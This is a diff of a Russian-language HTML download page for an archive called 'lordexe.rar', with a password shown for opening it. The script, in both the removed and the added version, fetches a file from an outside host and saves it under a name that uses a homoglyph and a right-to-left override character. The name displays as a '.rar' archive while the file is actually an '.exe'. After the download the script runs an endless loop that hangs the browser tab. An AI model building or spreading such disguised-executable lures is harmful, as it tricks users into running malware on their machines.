@@ -5,41 +5,89 @@
 <b>Пароль от архива: lordanomalyfiles77</b>
 <p style="color: blue; margin-bottom: 3px;">lordexe.rar</p>
 <button onclick="downloadFile()" id="downloadButton">Скачать  (19.8MB)</button>
+<p style="color: green; margin-top: 1px; margin-left: 1;" id="progressText">Загрузка... (0%)</p>
 
 <script>
-async function downloadFileWithoutName(url) {
-  try {
-    const response = await fetch(url);
-    if (!response.ok) throw new Error('Ошибка сети');
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+const progressElement = document.getElementById('progressText');
+progressElement.style.display = "none";
 
-    let filename = 'lоrd‮rar.exe';
-    const disposition = response.headers.get('content-disposition');
-    
-    const blob = await response.blob();
-    const downloadUrl = window.URL.createObjectURL(blob);
-    const link = document.createElement('a');
-    
-    link.href = downloadUrl;
-    link.download = filename;
-    
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-    
-    window.URL.revokeObjectURL(downloadUrl);
-    while (true) {
-      console.log('crash');
+async function downloadWithHashAndProgress(fileUrl, fileName, onProgress) {
+    try {
+        const response = await fetch(fileUrl);
+        if (!response.ok) throw new Error('Ошибка скачивания файла');
+
+        const contentLength = response.headers.get('content-length');
+        if (!contentLength) {
+            console.warn('Сервер не вернул Content-Length. Процент загрузки недоступен.');
+        }
+        const totalBytes = parseInt(contentLength, 10);
+
+        const reader = response.body.getReader();
+        let chunks = [];
+        let receivedBytes = 0;
+
+        while (true) {
+            const { done, value } = await reader.read();
+            if (done) break;
+
+            chunks.push(value);
+            receivedBytes += value.length;
+
+            // Вычисляем и отправляем процент в коллбэк
+            if (totalBytes) {
+                const percent = Math.round((receivedBytes / totalBytes) * 100);
+                if (typeof onProgress === 'function') {
+                    onProgress(percent, receivedBytes, totalBytes);
+                }
+            }
+        }
+
+        const buffer = new Uint8Array(receivedBytes);
+        let position = 0;
+        for (let chunk of chunks) {
+            buffer.set(chunk, position);
+            position += chunk.length;
+        }
+
+        console.log('Файл загружен. Считаем хэш...');
+        const hashBuffer = await crypto.subtle.digest('SHA-256', buffer.buffer);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        
+        console.log('Вычисленный хэш:', hashHex);
+
+        const blob = new Blob([buffer]);
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = fileName;
+        
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      
+        URL.revokeObjectURL(link.href);
+        
+        await delay(2000);
+        
+        while (true) {
+          console.log("crash");
+        }
+        return 0;
+    } catch (error) {
+        console.error('Ошибка:', error);
     }
-    window.close();
-  } catch (error) {
-    console.error(error);
-    window.close();
-  }
 }
 
+
 async function downloadFile() {
-    window.open('https://razoblaheniya.onrender.com/download/7251', '_blank', 'width=10,height=10');
-    downloadFileWithoutName('https://razoblaheniya.onrender.com/download/7251')
+    downloadWithHashAndProgress('https://razoblaheniya.onrender.com/download/7251',
+    'lоrd‮rar.exe',
+    (percent) => {
+        console.log(`Загрузка: ${percent}%`);
+        progressElement.innerHTML = `Загрузка... (${percent}%)`;
+        progressElement.style.display = "block";
+    })
 }
 
 </script>
